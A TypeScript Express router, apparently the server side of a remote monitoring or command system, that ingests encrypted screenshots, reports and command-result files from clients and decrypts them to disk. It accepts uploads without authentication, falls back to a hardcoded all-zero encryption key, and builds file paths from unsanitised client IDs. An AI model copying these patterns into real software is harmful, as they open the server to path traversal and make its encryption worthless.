import { Router } from "express";
import multer from "multer";
import path from "path";
import fs from "fs";
import { decryptAes256CbcPrefixedIv, decryptFileStream } from "../encryption";
import { requireAuth } from "../middleware/auth";
import { getClient } from "../store";

const router = Router();
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const tempDir = path.join(process.cwd(), "temp_uploads");
    if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
    cb(null, tempDir);
  },
  filename: (req, file, cb) => {
    cb(null, `${Date.now()}_${Math.random().toString(36).slice(2)}`);
  },
});
const upload = multer({
  storage,
  limits: { fileSize: 10 * 1024 * 1024 * 1024 },
});

const UPLOAD_DIR =
  process.env.UPLOAD_DIR || path.join(process.cwd(), "storage");

router.post("/screenshots", upload.single("screenshot"), async (req, res) => {
  const tempPath = req.file?.path;
  try {
    const clientId =
      (req.body.clientId as string) ||
      (req.headers["x-client-id"] as string) ||
      "";
    const timestampStr =
      (req.body.timestamp as string) || new Date().toISOString();
    if (!clientId || !req.file || !tempPath)
      return res
        .status(400)
        .json({ message: "clientId and screenshot required" });

    let client: any = getClient(clientId);
    if (!client) {
      // Fallback for new clients in file mode
      client = {
        id: clientId,
        encryptionKey:
          process.env.ENCRYPTION_KEY ||
          "0000000000000000000000000000000000000000000000000000000000000000",
      };
    }

    if (!client || !client.encryptionKey) {
      return res
        .status(400)
        .json({ message: "Client not registered or missing key" });
    }

    const clientDir = path.join(UPLOAD_DIR, "screenshots", clientId);
    fs.mkdirSync(clientDir, { recursive: true });

    // Treat the incoming timestamp as absolute truth (Client's Local Time)
    // If it's "2025-12-19T23:15:00.000" (no Z), new Date() might treat as Local or UTC depending on server env.
    // To ensure consistency, we force it to be treated as UTC so the numbers are preserved in DB.
    // DB stores UTC. Frontend sees UTC. "1 Time for Everything".
    let tsToParse = timestampStr;
    if (
      !tsToParse.endsWith("Z") &&
      !tsToParse.includes("+") &&
      !tsToParse.includes("-")
    ) {
      tsToParse += "Z";
    }
    const tsParsed = new Date(tsToParse);
    const sendTs = isNaN(tsParsed.getTime()) ? new Date() : tsParsed;

    const adjTs = sendTs;
    const iso = adjTs.toISOString().replace(/[:]/g, "-");
    const filename = `${clientId}_${iso}.jpg`;
    const filepath = path.join(clientDir, filename);

    await decryptFileStream(tempPath, filepath, client.encryptionKey);

    const rec = {
      id: `${clientId}_${Date.now()}`,
      filename,
      path: filepath,
      timestamp: adjTs,
    };
    // No prisma.screenshot.create call here as we are file-based

    res.json({
      ok: true,
      id: rec.id,
      filename,
      path: filepath,
      timestamp: adjTs.toISOString(),
    });
  } catch (e) {
    console.error(e);
    res.status(500).json({ message: "Failed to ingest screenshot" });
  } finally {
    if (tempPath && fs.existsSync(tempPath)) {
      try {
        fs.unlinkSync(tempPath);
      } catch {}
    }
  }
});

router.post("/reports", upload.single("report"), async (req, res) => {
  const tempPath = req.file?.path;
  try {
    const clientId =
      (req.body.clientId as string) ||
      (req.headers["x-client-id"] as string) ||
      "";
    const timestampStr = new Date().toISOString();
    if (!clientId || !req.file || !tempPath)
      return res.status(400).json({ message: "clientId and report required" });

    let client: any = getClient(clientId);
    if (!client) {
      client = {
        id: clientId,
        encryptionKey:
          process.env.ENCRYPTION_KEY ||
          "0000000000000000000000000000000000000000000000000000000000000000",
      };
    }

    if (!client || !client.encryptionKey) {
      return res
        .status(400)
        .json({ message: "Client not registered or missing key" });
    }

    const clientDir = path.join(UPLOAD_DIR, "reports", clientId);
    fs.mkdirSync(clientDir, { recursive: true });
    const now2 = new Date();
    const filename = `${now2.toISOString().replace(/[:]/g, "-")}_${Date.now()}`;
    const filepath = path.join(clientDir, filename);

    await decryptFileStream(tempPath, filepath, client.encryptionKey);

    const rec = {
      id: `${clientId}_${Date.now()}`,
      filename,
      path: filepath,
      timestamp: new Date(timestampStr),
    };
    // No prisma.report.create call here as we are file-based

    res.json({ id: rec.id });
  } catch (e) {
    console.error(e);
    res.status(500).json({ message: "Failed to ingest report" });
  } finally {
    if (tempPath && fs.existsSync(tempPath)) {
      try {
        fs.unlinkSync(tempPath);
      } catch {}
    }
  }
});

// Listings for admin
router.get("/screenshots", requireAuth, async (req, res) => {
  // File-based listing not implemented yet for screenshots/reports
  return res.json({ data: [], total: 0 });
});

router.put("/screenshots/:id/favorite", requireAuth, async (req, res) => {
  // Not implemented in file-based mode
  res.status(404).json({ message: "Not found" });
});

router.get("/reports", requireAuth, async (req, res) => {
  return res.json({ data: [], total: 0 });
});

// Secure file serving
router.get("/screenshots/:id/file", requireAuth, async (req, res) => {
  // Need to find path from ID. In file mode ID contains info or we scan.
  // ID format: clientId_timestamp.jpg (filename is ID mostly)
  // For now return 404 as we haven't implemented file index
  return res.status(404).json({ message: "Not found" });
});

router.get("/reports/:id/file", requireAuth, async (req, res) => {
  return res.status(404).json({ message: "Not found" });
});

// Reports CSV export
router.get("/reports/:id/csv", requireAuth, async (req, res) => {
  return res.status(404).json({ message: "Not found" });
});

// Command result file upload (encrypted)
router.post("/commands/:id/result", upload.single("file"), async (req, res) => {
  const tempPath = req.file?.path;
  try {
    const id = req.params.id;
    const clientId =
      (req.body.clientId as string) ||
      (req.headers["x-client-id"] as string) ||
      "";
    const timestampStr =
      (req.body.timestamp as string) || new Date().toISOString();
    if (!clientId || !req.file || !tempPath)
      return res.status(400).json({ message: "clientId and file required" });

    let client: any = getClient(clientId);
    if (!client) {
      client = {
        id: clientId,
        encryptionKey:
          process.env.ENCRYPTION_KEY ||
          "0000000000000000000000000000000000000000000000000000000000000000",
      };
    }

    if (!client || !client.encryptionKey) {
      return res
        .status(400)
        .json({ message: "Client not registered or missing key" });
    }

    const clientDir = path.join(UPLOAD_DIR, "commands", clientId);
    fs.mkdirSync(clientDir, { recursive: true });
    const filename = `${id}_${timestampStr.replace(/[:]/g, "-")}_${Date.now()}`;
    const filepath = path.join(clientDir, filename);

    await decryptFileStream(tempPath, filepath, client.encryptionKey);

    res.json({ ok: true, path: filepath });
  } catch (e) {
    console.error(e);
    res.status(500).json({ message: "Failed to ingest command file result" });
  } finally {
    if (tempPath && fs.existsSync(tempPath)) {
      try {
        fs.unlinkSync(tempPath);
      } catch {}
    }
  }
});

// Admin: download latest file result for a command id
router.get("/commands/:id/file/latest", requireAuth, async (req, res) => {
  try {
    const id = req.params.id;
    const baseDir = path.join(UPLOAD_DIR, "commands");
    const clientDirs = fs.existsSync(baseDir) ? fs.readdirSync(baseDir) : [];
    let latestPath = "";
    let latestMtime = 0;
    for (const c of clientDirs) {
      const dir = path.join(baseDir, c);
      const files = fs.readdirSync(dir).filter((f) => f.startsWith(`${id}_`));
      for (const f of files) {
        const fp = path.join(dir, f);
        const stat = fs.statSync(fp);
        if (stat.mtimeMs > latestMtime) {
          latestMtime = stat.mtimeMs;
          latestPath = fp;
        }
      }
    }
    if (!latestPath) return res.status(202).json({ message: "Pending" });
    res.sendFile(latestPath);
  } catch (e) {
    console.error(e);
    res.status(500).json({ message: "Failed to fetch command file" });
  }
});

export default router;
